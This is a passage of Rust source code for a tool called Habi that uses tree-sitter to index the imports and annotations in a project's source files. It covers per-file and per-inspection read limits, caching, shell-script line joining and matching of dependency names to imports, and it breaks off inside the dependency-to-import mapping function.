//! What a project's source code imports and annotates.
//!
//! A manifest says what a project declares; this says what its code reaches
//! for, with the file and line. Source files are parsed (tree-sitter), never
//! compiled or run, and only two things are kept from them: imported names and
//! annotation names. No other source text leaves this module.
//!
//! - One bounded index per inspection, built whatever the rules ask. A rule
//!   looks a name up in it (`code: {import: react}`), so a library cannot make
//!   Habi search a repository with patterns of its own or read it once per rule.
//! - Reading is bounded per file and per inspection. What a limit stopped is
//!   recorded under the `code` coverage area, and matching then treats "not
//!   found" as unknown.
//! - Files are remembered by size and modification time for the life of the
//!   process: the watcher re-inspects after every save, and only what changed is
//!   parsed again.
//! - Fixtures and installed skills are not read: a skill's example script says
//!   nothing about the project, as with file detection.
//! - The parsers are C. They get bounded input, a deadline and no privileges
//!   beyond this process's; they do not get a sandbox, and a parse error is not
//!   a gap (imports sit at the top of a file and survive syntax a grammar lacks).
//! - tree-sitter frees an abandoned parse stack recursively, and hostile input
//!   makes that stack as deep as the file is long. Overflowing a thread's stack
//!   ends the process, so parsers run only on threads with room for the largest
//!   file they may be given (`PARSER_STACK`, `on_parser_stack`).

use super::files;
use super::model::{CodeKind, CodeLanguage, Ecosystem, Evidence, Fact, FactSubject, Stamp};
use crate::cancel::CancelToken;
use crate::error::Result;
use crate::fsutil::{Bounded, read_bounded};
use std::collections::hash_map::Entry;
use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
use std::ops::ControlFlow;
use std::path::Path;
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, LazyLock, Mutex, PoisonError};
use std::time::{Duration, Instant};
use tree_sitter::{
    Language, ParseOptions, Parser, Query, QueryCursor, QueryCursorOptions, StreamingIterator,
};

/// Longest name kept. Anything longer is not a name someone wrote by hand.
const MAX_NAME: usize = 200;
/// Different names kept from one file.
const MAX_SYMBOLS_PER_FILE: usize = 2_000;
/// (file, name) pairs kept in one inspection; past it, reading stops.
const MAX_OCCURRENCES: usize = 2_000_000;
/// Matches per query in one file, so a pathological file cannot grow the cursor.
const MATCH_LIMIT: u32 = 4_096;
/// Average line length above which a file is treated as minified or generated.
const MINIFIED_LINE: usize = 1_000;
/// Locations cited for one finding.
pub const MAX_CITED: usize = 3;
/// Files remembered across inspections in this process.
const MAX_REMEMBERED: usize = 400_000;
/// Largest shell script read through the parser.
const SHELL_LIMIT: usize = 256 * 1024;
/// Stack for a thread that runs a parser. Freeing a parse stack recurses at most
/// once per token, so at most once per byte of the largest file (`file_bytes`),
/// with a frame of about 100 bytes. Address space until touched, given back when
/// the thread ends.
const PARSER_STACK: usize = 256 * 1024 * 1024;

/// How much source one inspection reads.
#[derive(Debug, Clone)]
pub struct CodeLimits {
    /// Source files read at most.
    pub files: usize,
    /// Size of the largest file read.
    pub file_bytes: u64,
    /// Bytes read at most. Files remembered from an earlier inspection cost nothing.
    pub total_bytes: u64,
    /// Time one file may take to parse.
    pub file_time: Duration,
    /// Time all files may take. A later inspection continues where this one
    /// stopped, because what was read is remembered.
    pub total_time: Duration,
}

impl Default for CodeLimits {
    fn default() -> Self {
        CodeLimits {
            files: 30_000,
            file_bytes: 1024 * 1024,
            total_bytes: 512 * 1024 * 1024,
            file_time: Duration::from_secs(1),
            total_time: Duration::from_secs(30),
        }
    }
}

/// The grammars Habi carries. TypeScript has two, JSX is part of JavaScript's.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum Syntax {
    Java,
    Kotlin,
    JavaScript,
    TypeScript,
    Tsx,
    Python,
    Go,
    Rust,
    Php,
}

impl Syntax {
    const ALL: [Syntax; 9] = [
        Syntax::Java,
        Syntax::Kotlin,
        Syntax::JavaScript,
        Syntax::TypeScript,
        Syntax::Tsx,
        Syntax::Python,
        Syntax::Go,
        Syntax::Rust,
        Syntax::Php,
    ];

    fn language(self) -> CodeLanguage {
        match self {
            Syntax::Java => CodeLanguage::Java,
            Syntax::Kotlin => CodeLanguage::Kotlin,
            Syntax::JavaScript => CodeLanguage::Javascript,
            Syntax::TypeScript | Syntax::Tsx => CodeLanguage::Typescript,
            Syntax::Python => CodeLanguage::Python,
            Syntax::Go => CodeLanguage::Go,
            Syntax::Rust => CodeLanguage::Rust,
            Syntax::Php => CodeLanguage::Php,
        }
    }

    fn grammar(self) -> Language {
        match self {
            Syntax::Java => tree_sitter_java::LANGUAGE,
            Syntax::Kotlin => tree_sitter_kotlin_ng::LANGUAGE,
            Syntax::JavaScript => tree_sitter_javascript::LANGUAGE,
            Syntax::TypeScript => tree_sitter_typescript::LANGUAGE_TYPESCRIPT,
            Syntax::Tsx => tree_sitter_typescript::LANGUAGE_TSX,
            Syntax::Python => tree_sitter_python::LANGUAGE,
            Syntax::Go => tree_sitter_go::LANGUAGE,
            Syntax::Rust => tree_sitter_rust::LANGUAGE,
            Syntax::Php => tree_sitter_php::LANGUAGE_PHP,
        }
        .into()
    }

    /// What to keep from a parse. `@import` and `@annotation` are names; any
    /// other capture only serves a predicate.
    fn query(self) -> String {
        const IMPORTS_AND_DECORATORS: &str = r#"
            (import_statement source: (string (string_fragment) @import))
            (export_statement source: (string (string_fragment) @import))
            (call_expression
              function: (identifier) @_require
              arguments: (arguments . (string (string_fragment) @import))
              (#eq? @_require "require"))
            (call_expression
              function: (import)
              arguments: (arguments . (string (string_fragment) @import)))
            (decorator (identifier) @annotation)
            (decorator (member_expression) @annotation)
            (decorator (call_expression function: (identifier) @annotation))
            (decorator (call_expression function: (member_expression) @annotation))
        "#;
        match self {
            Syntax::Java => r#"
                (import_declaration (scoped_identifier) @import)
                (import_declaration (identifier) @import)
                (marker_annotation name: (_) @annotation)
                (annotation name: (_) @annotation)
            "#
            .to_string(),
            Syntax::Kotlin => r#"
                (import (qualified_identifier) @import)
                (annotation (user_type) @annotation)
                (annotation (constructor_invocation (user_type) @annotation))
            "#
            .to_string(),
            Syntax::JavaScript => IMPORTS_AND_DECORATORS.to_string(),
            Syntax::TypeScript | Syntax::Tsx => format!(
                "{IMPORTS_AND_DECORATORS}
                 (import_require_clause source: (string (string_fragment) @import))"
            ),
            Syntax::Python => r#"
                (import_statement name: (dotted_name) @import)
                (import_statement name: (aliased_import name: (dotted_name) @import))
                (import_from_statement module_name: (dotted_name) @import)
                (decorator (identifier) @annotation)
                (decorator (attribute) @annotation)
                (decorator (call function: (identifier) @annotation))
                (decorator (call function: (attribute) @annotation))
            "#
            .to_string(),
            Syntax::Go => r#"
                (import_spec path: (interpreted_string_literal
                  (interpreted_string_literal_content) @import))
            "#
            .to_string(),
            // A path used without `use` (`serde_json::from_str`) is an import
            // in all but name; `normalize` keeps only those that start lowercase.
            Syntax::Rust => r#"
                (use_declaration argument: (_) @import)
                (extern_crate_declaration name: (identifier) @import)
                (scoped_identifier path: (identifier) @import)
                (scoped_type_identifier path: (identifier) @import)
                (attribute_item (attribute . (identifier) @annotation))
                (attribute_item (attribute . (scoped_identifier) @annotation))
                (inner_attribute_item (attribute . (identifier) @annotation))
                (inner_attribute_item (attribute . (scoped_identifier) @annotation))
                (attribute_item
                  (attribute (identifier) @_derive
                    arguments: (token_tree (identifier) @annotation))
                  (#eq? @_derive "derive"))
            "#
            .to_string(),
            Syntax::Php => r#"
                (namespace_use_clause . (qualified_name) @import)
                (namespace_use_clause . (name) @import)
                (namespace_use_declaration (namespace_name) @import)
                (attribute . (name) @annotation)
                (attribute . (qualified_name) @annotation)
            "#
            .to_string(),
        }
    }
}

struct Compiled {
    language: Language,
    query: Query,
    import: Option<u32>,
    annotation: Option<u32>,
}

static COMPILED: LazyLock<HashMap<Syntax, Compiled>> = LazyLock::new(|| {
    Syntax::ALL
        .iter()
        .map(|&syntax| {
            let language = syntax.grammar();
            let query = Query::new(&language, &syntax.query()).expect("code query compiles");
            let import = query.capture_index_for_name("import");
            let annotation = query.capture_index_for_name("annotation");
            let compiled = Compiled {
                language,
                query,
                import,
                annotation,
            };
            (syntax, compiled)
        })
        .collect()
});

fn extension(path: &str) -> &str {
    let name = path.rsplit('/').next().unwrap_or(path);
    name.rsplit_once('.').map_or("", |(_, ext)| ext)
}

/// The grammar for a source file. Declarations (`.d.ts`) and bundles describe
/// or repeat other code; Gradle scripts are build files, not the project's code.
fn syntax_of(path: &str) -> Option<Syntax> {
    let name = path.rsplit('/').next().unwrap_or(path);
    if name.ends_with(".d.ts")
        || name.ends_with(".gradle.kts")
        || name.ends_with(".min.js")
        || name.ends_with(".bundle.js")
    {
        return None;
    }
    match extension(name) {
        "java" => Some(Syntax::Java),
        "kt" | "kts" => Some(Syntax::Kotlin),
        "js" | "jsx" | "mjs" | "cjs" => Some(Syntax::JavaScript),
        "ts" | "mts" | "cts" => Some(Syntax::TypeScript),
        "tsx" => Some(Syntax::Tsx),
        "py" => Some(Syntax::Python),
        "go" => Some(Syntax::Go),
        "rs" => Some(Syntax::Rust),
        "php" => Some(Syntax::Php),
        _ => None,
    }
}

/// Languages with imports that Habi recognizes but carries no grammar for, so
/// their absence from the index says nothing.
fn unread_language(path: &str) -> Option<&'static str> {
    match files::language_of(path) {
        Some("lang:csharp") => Some("C#"),
        Some("lang:scala") => Some("Scala"),
        _ => None,
    }
}

/// The name as a rule would spell it, or `None` for what is no name to keep:
/// paths inside the project, URLs and anything that does not look like an
/// identifier (nothing else from a source file may reach a reason).
fn normalize(language: CodeLanguage, kind: CodeKind, text: &str) -> Option<String> {
    let text: String = text.chars().filter(|c| !c.is_whitespace()).collect();
    let name = match (language, kind) {
        (CodeLanguage::Javascript | CodeLanguage::Typescript, CodeKind::Import) => {
            if text.starts_with('.')
                || text.starts_with('/')
                || text.starts_with("@/")
                || text.starts_with("~/")
                || text.starts_with('#')
            {
                return None;
            }
            text
        }
        (CodeLanguage::Rust, CodeKind::Import) => {
            let end = ["::{", "::*"]
                .iter()
                .filter_map(|cut| text.find(cut))
                .min()
                .unwrap_or(text.len());
            let path = text.get(..end).unwrap_or(&text);
            let root = path.split("::").next().unwrap_or(path);
            if matches!(root, "crate" | "self" | "super" | "")
                || !root.starts_with(|c: char| c.is_ascii_lowercase())
            {
                return None;
            }
            path.to_string()
        }
        (CodeLanguage::Go, CodeKind::Import) if text == "C" => return None,
        (CodeLanguage::Php, _) => text.trim_start_matches('\\').to_string(),
        (CodeLanguage::Kotlin, CodeKind::Annotation) => {
            text.split('<').next().unwrap_or(&text).to_string()
        }
        _ => text,
    };
    let clean = !name.is_empty()
        && name.len() <= MAX_NAME
        && !name.contains("://")
        && name
            .chars()
            .all(|c| c.is_alphanumeric() || "._-/@:\\$+~".contains(c));
    clean.then_some(name)
}

/// Rust's `use a::b as c` loses its spaces in `normalize`, so the alias goes
/// here, on the text as written.
fn without_alias(language: CodeLanguage, text: &str) -> &str {
    match language {
        CodeLanguage::Rust => text.split(" as ").next().unwrap_or(text),
        _ => text,
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct Found {
    kind: CodeKind,
    name: String,
    line: u32,
}

/// The names in one file. `None` when parsing was stopped.
fn extract(
    syntax: Syntax,
    bytes: &[u8],
    parsers: &mut HashMap<Syntax, Parser>,
    deadline: Instant,
    cancel: &CancelToken,
) -> Option<Vec<Found>> {
    let compiled = COMPILED.get(&syntax)?;
    let parser = match parsers.entry(syntax) {
        Entry::Occupied(p) => p.into_mut(),
        Entry::Vacant(slot) => {
            let mut parser = Parser::new();
            parser.set_language(&compiled.language).ok()?;
            slot.insert(parser)
        }
    };
    let mut progress = |_: &tree_sitter::ParseState| {
        if cancel.is_cancelled() || Instant::now() > deadline {
            ControlFlow::Break(())
        } else {
            ControlFlow::Continue(())
        }
    };
    let options = ParseOptions::new().progress_callback(&mut progress);
    let tree = parser.parse_with_options(
        &mut |at, _| bytes.get(at..).unwrap_or_default(),
        None,
        Some(options),
    );
    let Some(tree) = tree else {
        // A stopped parse keeps its state for resuming, which this never does.
        parser.reset();
        return None;
    };

    let language = syntax.language();
    let mut first: HashMap<(CodeKind, String), u32> = HashMap::new();
    let mut cursor = QueryCursor::new();
    cursor.set_match_limit(MATCH_LIMIT);
    let mut in_time = |_: &tree_sitter::QueryCursorState| {
        if cancel.is_cancelled() || Instant::now() > deadline {
            ControlFlow::Break(())
        } else {
            ControlFlow::Continue(())
        }
    };
    let query_options = QueryCursorOptions::new().progress_callback(&mut in_time);
    let mut matches =
        cursor.matches_with_options(&compiled.query, tree.root_node(), bytes, query_options);
    while let Some(m) = matches.next() {
        for capture in m.captures() {
            let kind = if Some(capture.index) == compiled.import {
                CodeKind::Import
            } else if Some(capture.index) == compiled.annotation {
                CodeKind::Annotation
            } else {
                continue;
            };
            let Ok(text) = capture.node.utf8_text(bytes) else {
                continue;
            };
            let text = without_alias(language, text);
            let Some(name) = normalize(language, kind, text) else {
                continue;
            };
            let line = u32::try_from(capture.node.start_position().row + 1).unwrap_or(u32::MAX);
            let key = (kind, name);
            let room = first.len() < MAX_SYMBOLS_PER_FILE;
            match first.entry(key) {
                Entry::Occupied(mut seen) => {
                    let least = (*seen.get()).min(line);
                    seen.insert(least);
                }
                Entry::Vacant(slot) if room => {
                    slot.insert(line);
                }
                Entry::Vacant(_) => {}
            }
        }
    }
    // A query stopped by the deadline ends like one that finished: only the
    // clock tells them apart. What it found may be partial, so it does not count.
    if cancel.is_cancelled() || Instant::now() > deadline {
        return None;
    }
    let mut found: Vec<Found> = first
        .into_iter()
        .map(|((kind, name), line)| Found { kind, name, line })
        .collect();
    found.sort_by(|a, b| a.line.cmp(&b.line).then_with(|| a.name.cmp(&b.name)));
    Some(found)
}

/// Minified or generated: long lines on average, or not text at all.
fn is_not_source(bytes: &[u8]) -> bool {
    if bytes.contains(&0) {
        return true;
    }
    let lines = bytes.iter().filter(|b| **b == b'\n').count() + 1;
    bytes.len() / lines > MINIFIED_LINE
}

#[derive(Clone)]
struct Remembered {
    stamp: Stamp,
    found: Arc<[Found]>,
}

/// What was found in each file, by absolute path.
static REMEMBERED: LazyLock<Mutex<HashMap<String, Remembered>>> = LazyLock::new(Default::default);

enum Outcome {
    Found(Arc<[Found]>),
    /// Not source after all: minified, generated or binary. Not a gap.
    NotSource,
    TooLarge,
    Unreadable,
    /// A limit on time or bytes came first.
    Stopped,
}

/// One name in one language, within one module: where it appears, by index
/// into `CodeIndex::paths`, with the first line in each file.
type Occurrences = Vec<(u32, u32)>;

#[derive(Debug, Default)]
pub struct ModuleCode {
    /// (kind, name, language) → occurrences. Sorted, so a name and everything
    /// beneath it can be found by range.
    symbols: BTreeMap<(CodeKind, String, CodeLanguage), Occurrences>,
    /// Languages this module's source was read in.
    pub read: BTreeSet<CodeLanguage>,
    /// Languages it holds that Habi has no grammar for.
    pub unread: BTreeSet<&'static str>,
}

/// One finding: the name, how many files hold it, and the most telling few.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Usage {
    pub files: u32,
    pub cited: Vec<Evidence>,
}

/// Everything Habi kept from a project's source.
#[derive(Debug, Default)]
pub struct CodeIndex {
    paths: Vec<String>,
    modules: HashMap<String, ModuleCode>,
    /// What each dependency or tag fact's code uses, by fact id. Only those found.
    usage: HashMap<String, Usage>,
}

/// The outcome of reading a project's source.
pub(crate) struct Scanned {
    pub index: CodeIndex,
    /// Why some of a module's source was not read.
    pub gaps: BTreeMap<String, Vec<String>>,
    pub files_read: u32,
}

/// Test and tooling files say less about a project than its own code, so they
/// are cited last. They still count.
fn is_secondary(path: &str) -> bool {
    let (dirs, name) = path.rsplit_once('/').unwrap_or(("", path));
    let lower = name.to_ascii_lowercase();
    lower.contains(".test.")
        || lower.contains(".spec.")
        || lower.contains("_test.")
        || lower.starts_with("test_")
        || lower.ends_with("test.java")
        || lower.ends_with("test.kt")
        || dirs.split('/').any(|d| {
            matches!(
                d,
                "test"
                    | "tests"
                    | "__tests__"
                    | "e2e"
                    | "spec"
                    | "examples"
                    | "example"
                    | "scripts"
            )
        })
}

/// Reads the source files in `files` into an index. `module_of` is the module
/// that owns a path. Stops early, and says so per module, at any of `limits`.
pub(crate) fn scan(
    root: &Path,
    files: &[(String, u64)],
    module_of: &dyn Fn(&str) -> String,
    limits: &CodeLimits,
    cancel: &CancelToken,
) -> Result<Scanned> {
    let mut wanted: Vec<(&str, Syntax)> = Vec::new();
    let mut index = CodeIndex::default();
    for (path, _) in files {
        if files::in_fixture(path) || files::inside_skill_package(path) {
            continue;
        }
        if let Some(language) = unread_language(path) {
            index
                .modules
                .entry(module_of(path))
                .or_default()
                .unread
                .insert(language);
        }
        if let Some(syntax) = syntax_of(path) {
            wanted.push((path, syntax));
        }
    }

    let (now, past_limit) = wanted.split_at(wanted.len().min(limits.files));
    let mut outcomes = read_all(root, now, limits, cancel);
    cancel.check()?;
    outcomes.extend(past_limit.iter().map(|_| Outcome::Stopped));

    let mut too_large: BTreeMap<String, u32> = BTreeMap::new();
    let mut unreadable: BTreeMap<String, u32> = BTreeMap::new();
    let mut stopped: BTreeMap<String, u32> = BTreeMap::new();
    let mut files_read = 0;
    let mut occurrences = 0;
    for ((path, syntax), outcome) in wanted.iter().zip(outcomes) {
        let module = module_of(path);
        match outcome {
            Outcome::Found(_) if occurrences >= MAX_OCCURRENCES => {
                *stopped.entry(module).or_default() += 1;
            }
            Outcome::Found(found) => {
                files_read += 1;
                occurrences += found.len();
                let at = u32::try_from(index.paths.len()).unwrap_or(u32::MAX);
                index.paths.push((*path).to_string());
                let language = syntax.language();
                let code = index.modules.entry(module).or_default();
                code.read.insert(language);
                for f in found.iter() {
                    code.symbols
                        .entry((f.kind, f.name.clone(), language))
                        .or_default()
                        .push((at, f.line));
                }
            }
            Outcome::NotSource => {}
            Outcome::TooLarge => *too_large.entry(module).or_default() += 1,
            Outcome::Unreadable => *unreadable.entry(module).or_default() += 1,
            Outcome::Stopped => *stopped.entry(module).or_default() += 1,
        }
    }

    let mut gaps: BTreeMap<String, Vec<String>> = BTreeMap::new();
    let mut note = |counts: BTreeMap<String, u32>, why: String| {
        for (module, n) in counts {
            let (files, were) = if n == 1 {
                ("file", "was")
            } else {
                ("files", "were")
            };
            gaps.entry(module).or_default().push(format!(
                "{n} source {files} in this module {were} not read: {why}."
            ));
        }
    };
    note(
        too_large,
        format!("above the {} KiB limit", limits.file_bytes / 1024),
    );
    note(unreadable, "they could not be opened".to_string());
    note(
        stopped,
        "Habi reads a limited amount of source in one inspection".to_string(),
    );
    Ok(Scanned {
        index,
        gaps,
        files_read,
    })
}

/// Runs `f` on a thread with room for a parser.
fn on_parser_stack<T: Send>(f: impl FnOnce() -> T + Send) -> Option<T> {
    std::thread::scope(|scope| {
        std::thread::Builder::new()
            .stack_size(PARSER_STACK)
            .spawn_scoped(scope, f)
            .ok()?
            .join()
            .ok()
    })
}

/// Reads `wanted` on a few threads, in order of the list, and returns one
/// outcome per file. A worker that panics or cannot start leaves its files
/// marked as stopped.
fn read_all(
    root: &Path,
    wanted: &[(&str, Syntax)],
    limits: &CodeLimits,
    cancel: &CancelToken,
) -> Vec<Outcome> {
    let workers = std::thread::available_parallelism()
        .map_or(1, |n| n.get().saturating_sub(1))
        .clamp(1, 8);
    let next = AtomicUsize::new(0);
    let bytes_left = AtomicU64::new(limits.total_bytes);
    let until = Instant::now() + limits.total_time;
    let work = || {
        let mut parsers = HashMap::new();
        let mut done = Vec::new();
        loop {
            let at = next.fetch_add(1, Ordering::Relaxed);
            let Some(&(path, syntax)) = wanted.get(at) else {
                return done;
            };
            let outcome = read_one(
                root,
                path,
                syntax,
                limits,
                until,
                &bytes_left,
                &mut parsers,
                cancel,
            );
            done.push((at, outcome));
        }
    };
    let finished: Vec<(usize, Outcome)> = std::thread::scope(|scope| {
        let handles: Vec<_> = (0..workers)
            .filter_map(|_| {
                std::thread::Builder::new()
                    .stack_size(PARSER_STACK)
                    .spawn_scoped(scope, work)
                    .ok()
            })
            .collect();
        handles
            .into_iter()
            .filter_map(|h| h.join().ok())
            .flatten()
            .collect()
    });
    let mut outcomes: Vec<Outcome> = wanted.iter().map(|_| Outcome::Stopped).collect();
    for (at, outcome) in finished {
        if let Some(slot) = outcomes.get_mut(at) {
            *slot = outcome;
        }
    }
    outcomes
}

#[allow(
    clippy::too_many_arguments,
    reason = "one worker's context, called once"
)]
fn read_one(
    root: &Path,
    path: &str,
    syntax: Syntax,
    limits: &CodeLimits,
    until: Instant,
    bytes_left: &AtomicU64,
    parsers: &mut HashMap<Syntax, Parser>,
    cancel: &CancelToken,
) -> Outcome {
    let full = root.join(path);
    let Some(stamp) = Stamp::of(&full) else {
        return Outcome::Unreadable;
    };
    if !Stamp::is_regular_file(&full) {
        return Outcome::Unreadable;
    }
    let key = full.to_string_lossy().into_owned();
    if let Some(known) = REMEMBERED
        .lock()
        .unwrap_or_else(PoisonError::into_inner)
        .get(&key)
        .filter(|known| known.stamp == stamp)
    {
        return Outcome::Found(known.found.clone());
    }
    let now = Instant::now();
    if cancel.is_cancelled() || now > until {
        return Outcome::Stopped;
    }
    let size = stamp.size();
    if size > limits.file_bytes {
        return Outcome::TooLarge;
    }
    if bytes_left
        .fetch_update(Ordering::Relaxed, Ordering::Relaxed, |left| {
            left.checked_sub(size)
        })
        .is_err()
    {
        return Outcome::Stopped;
    }
    let bytes = match read_bounded(&full, limits.file_bytes) {
        Ok(Bounded::Content(bytes)) => bytes,
        Ok(Bounded::TooLarge(_)) => return Outcome::TooLarge,
        Err(_) => return Outcome::Unreadable,
    };
    if is_not_source(&bytes) {
        return Outcome::NotSource;
    }
    let deadline = now + limits.file_time;
    let Some(found) = extract(syntax, &bytes, parsers, deadline, cancel) else {
        return Outcome::Stopped;
    };
    let found: Arc<[Found]> = found.into();
    let mut remembered = REMEMBERED.lock().unwrap_or_else(PoisonError::into_inner);
    if remembered.len() >= MAX_REMEMBERED {
        remembered.clear();
    }
    remembered.insert(
        key,
        Remembered {
            stamp,
            found: found.clone(),
        },
    );
    Outcome::Found(found)
}

/// A shell script's text with comments gone and each command that continues
/// over lines (`\\` at the end, or a pipe) on one line, with the line it starts
/// on. `None` when the script does not parse cleanly or is past `SHELL_LIMIT`:
/// the caller reads it line by line, as it reads anything else. A script that
/// breaks the parser must not be read as less than its lines say.
pub fn shell_commands(text: &str) -> Option<Vec<(u32, String)>> {
    if text.len() > SHELL_LIMIT {
        return None;
    }
    on_parser_stack(|| parse_shell(text)).flatten()
}

fn parse_shell(text: &str) -> Option<Vec<(u32, String)>> {
    let mut parser = Parser::new();
    let language: Language = tree_sitter_bash::LANGUAGE.into();
    parser.set_language(&language).ok()?;
    let deadline = Instant::now() + Duration::from_secs(1);
    let mut progress = |_: &tree_sitter::ParseState| {
        if Instant::now() > deadline {
            ControlFlow::Break(())
        } else {
            ControlFlow::Continue(())
        }
    };
    let options = ParseOptions::new().progress_callback(&mut progress);
    let bytes = text.as_bytes();
    let tree = parser.parse_with_options(
        &mut |at, _| bytes.get(at..).unwrap_or_default(),
        None,
        Some(options),
    )?;
    let root = tree.root_node();
    if root.has_error() {
        return None;
    }
    // Spaces instead of comments, keeping every other byte where it was.
    let mut clean = bytes.to_vec();
    let mut stack = vec![root];
    let mut starts: BTreeMap<usize, usize> = BTreeMap::new();
    while let Some(node) = stack.pop() {
        if node.kind() == "comment" {
            if let Some(span) = clean.get_mut(node.byte_range()) {
                span.fill(b' ');
            }
            continue;
        }
        // One logical line per statement; a statement holding others (`if`,
        // a function, a loop) is broken down instead, or its body would be one line.
        let mut cursor = node.walk();
        let children: Vec<_> = node.named_children(&mut cursor).collect();
        if is_single_command(node.kind()) && node.start_position().row != node.end_position().row {
            starts.insert(node.start_byte(), node.end_byte());
        } else {
            stack.extend(children);
        }
    }
    let joined = |range: std::ops::Range<usize>| -> String {
        let piece = String::from_utf8_lossy(clean.get(range).unwrap_or_default()).into_owned();
        piece.replace("\\\n", " ").replace('\n', " ")
    };
    let mut lines = Vec::new();
    let mut at = 0;
    let mut number: u32 = 1;
    while at < clean.len() {
        if let Some(&end) = starts.get(&at) {
            lines.push((number, joined(at..end)));
            let newlines = clean
                .get(at..end)
                .unwrap_or_default()
                .iter()
                .filter(|b| **b == b'\n')
                .count();
            number += u32::try_from(newlines).unwrap_or(0);
            at = end;
            continue;
        }
        // A multi-line command can start partway through a line.
        let line_end = clean
            .get(at..)
            .unwrap_or_default()
            .iter()
            .position(|b| *b == b'\n')
            .map_or(clean.len(), |n| at + n);
        let next = starts.range(at + 1..line_end.max(at + 1)).next();
        match next {
            Some((&start, _)) => {
                lines.push((number, joined(at..start)));
                at = start;
            }
            None => {
                lines.push((number, joined(at..line_end)));
                number += 1;
                at = line_end + 1;
            }
        }
    }
    Some(lines)
}

/// Statements whose whole text is one thing to read, however many lines it takes.
fn is_single_command(kind: &str) -> bool {
    matches!(
        kind,
        "command" | "pipeline" | "list" | "redirected_statement"
    )
}

/// Whether `pattern` names an import: exactly, as a parent of it (`react` holds
/// `react/jsx-runtime`, not `react-dom`), or with `*` wildcards.
pub fn import_matches(pattern: &str, name: &str) -> bool {
    if pattern.contains('*') {
        return super::tags::wildcard_match(pattern, name);
    }
    match name.strip_prefix(pattern) {
        Some("") => true,
        Some(rest) => rest.starts_with(['.', '/', ':', '\\']),
        None => false,
    }
}

/// Whether `pattern` names an annotation: as written (`pytest.fixture`,
/// `tokio::main`), or by its last part alone when the pattern has no qualifier
/// (`Transactional` for `org.springframework.Transactional`).
pub fn annotation_matches(pattern: &str, name: &str) -> bool {
    if super::tags::wildcard_match(pattern, name) {
        return true;
    }
    if pattern.contains(['.', ':', '\\']) {
        return false;
    }
    let last = name.rsplit(['.', ':', '\\']).next().unwrap_or(name);
    super::tags::wildcard_match(pattern, last)
}

/// What an artifact's name adds when it says nothing about what it holds.
const GENERIC_ARTIFACT: &[&str] = &["core", "api", "all", "runtime", "client", "common", "java"];

/// The packages of technologies usually reached through artifacts that do not
/// name them: JUnit through `spring-boot-starter-test`, Spring Boot through its
/// starters. A tag here cites these on the JVM and nothing else, so what it cites
/// is always that technology, whichever dependency brought it in.
const TAG_PACKAGES: &[(&str, &[&str])] = &[
    ("framework:spring-boot", &["org.springframework.boot"]),
    ("framework:spring", &["org.springframework"]),
    (
        "framework:spring-security",
        &["org.springframework.security"],
    ),
    ("framework:spring-batch", &["org.springframework.batch"]),
    ("framework:spring-cloud", &["org.springframework.cloud"]),
    ("framework:quarkus", &["io.quarkus"]),
    ("framework:micronaut", &["io.micronaut"]),
    ("test:junit", &["org.junit", "junit"]),
    ("test:testcontainers", &["org.testcontainers"]),
    ("test:cucumber", &["io.cucumber", "cucumber.api"]),
    (
        "test:selenium",
        &["org.openqa.selenium", "com.codeborne.selenide"],
    ),
    ("test:testng", &["org.testng"]),
    ("test:spock", &["spock.lang"]),
    ("test:mockito", &["org.mockito"]),
    ("test:rest-assured", &["io.restassured"]),
    ("test:karate", &["com.intuit.karate"]),
    ("test:gatling", &["io.gatling"]),
    ("test:appium", &["io.appium"]),
    ("test:pact", &["au.com.dius.pact"]),
    (
        "test:wiremock",
        &["com.github.tomakehurst.wiremock", "org.wiremock"],
    ),
    ("db:liquibase", &["liquibase"]),
    ("db:flyway", &["org.flywaydb"]),
    ("db:jooq", &["org.jooq"]),
    ("db:postgres", &["org.postgresql"]),
    (
        "orm:jpa",
        &["jakarta.persistence", "javax.persistence", "org.hibernate"],
    ),
    ("api:springdoc", &["org.springdoc"]),
    ("api:graphql", &["graphql"]),
    ("data:spark", &["org.apache.spark"]),
    ("data:beam", &["org.apache.beam"]),
    ("data:kafka", &["org.apache.kafka"]),
    ("data:mlflow", &["org.mlflow"]),
    ("cloud:aws", &["software.amazon.awssdk", "com.amazonaws"]),
    ("cloud:azure", &["com.azure", "com.microsoft.azure"]),
    ("cloud:gcp", &["com.google.cloud"]),
    ("sdk:stripe", &["com.stripe"]),
    ("sdk:twilio", &["com.twilio"]),
    ("sdk:firebase", &["com.google.firebase"]),
    ("sdk:sentry", &["io.sentry"]),
];

/// The imports a dependency would be written as in code, with the languages
/// that could write them. Empty when its name does not say: a claim about use
/// is only made when it holds of this dependency, so most doubt means silence.
fn import_patterns(ecosystem: Ecosystem, name: &str) -> (Vec<String>, &'static [CodeLanguage]) {
    const JS: &[CodeLanguage] = &[CodeLanguage::Javascript, CodeLanguage::Typescript];
    const JVM: &[CodeLanguage] = &[CodeLanguage::Java, CodeLanguage::Kotlin];
    match ecosystem {
        Ecosystem::Npm => (
            vec![name.strip_prefix("@types/").unwrap_or(name).to_string()],
            JS,
        ),
        Ecosystem::Go => (vec![name.to_string()], &[CodeLanguage::Go]),
        Ecosystem::Cargo => (vec![name.replace('-', "_")], &[CodeLanguage::Rust]),
        Ecosystem::Pypi => {
            let lower = name.to_ascii_lowercase();
            let known = match lower.as_str() {
                "pyyaml" => Some("yaml"),
                "beautifulsoup4" => Some("bs4"),
                "pillow" => Some("PIL"),
                "scikit-learn" => Some("sklearn"),
                "opencv-python" => Some("cv2"),
                "python-dateutil" => Some("dateutil"),
                "python-dotenv" => Some("dotenv"),
                "protobuf" => Some("google.protobuf"),
                _ => None,
            };
            let patterns = match known {
                Some(module) => vec![module.to_string()],
                // `google-cloud-storage` is `google.cloud.storage`.
                None if lower.contains('-') => {
                    vec![lower.replace('-', "_"), lower.replace('-', ".")]
                }
                None => vec![lower],
            };
            (patterns, &[CodeLanguage::Python])
        }
        Ecosystem::Maven | Ecosystem::Gradle => {
            let Some((group, artifact)) = name.split_once(':') else {
                return (Vec::new(), JVM);
            };
            // A group holds many artifacts, so the group alone does not say
            // this one is used: `spring-boot-starter-test` is not cited for
            // `org.springframework.boot.SpringApplication`. Only the package
            // the artifact names counts (`spring-jdbc`, `org.springframework.jdbc`),
            // or the group when the artifact is what the group is named for
            // (`jooq`, `spring-kafka`, `mockito-core`).
            let last = group.rsplit('.').next().unwrap_or(group);
